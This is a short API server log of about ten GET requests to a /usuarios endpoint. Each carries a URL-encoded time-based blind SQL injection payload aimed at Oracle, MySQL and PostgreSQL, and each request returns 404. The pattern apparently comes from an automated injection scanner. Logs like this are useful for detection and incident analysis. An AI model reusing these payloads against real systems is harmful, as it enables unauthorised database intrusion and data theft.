api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:38812 - "GET /usuarios%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2878%29%7C%7CCHR%28116%29%7C%7CCHR%2886%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38826 - "GET /usuarios%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2878%29%7C%7CCHR%28116%29%7C%7CCHR%2886%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38828 - "GET /usuarios%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2878%29%7C%7CCHR%28116%29%7C%7CCHR%2886%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38842 - "GET /usuarios%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2878%29%7C%7CCHR%28116%29%7C%7CCHR%2886%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38850 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5915/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29QwgV%29/%2A%2A/AND/%2A%2A/%285218%3D5218 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38860 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5915/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29QwgV%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38864 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5915/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29QwgV%29/%2A%2A/AND/%2A%2A/%28%27WNjA%27%3D%27WNjA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38876 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5915/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29QwgV%29/%2A%2A/AND/%2A%2A/%27XiGC%27%3D%27XiGC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38882 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/5915/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29QwgV%29--/%2A%2A/qNFf HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38884 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/7575%3D%28SELECT/%2A%2A/7575/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%283159%3D3159 HTTP/1.1" 404 Not Found
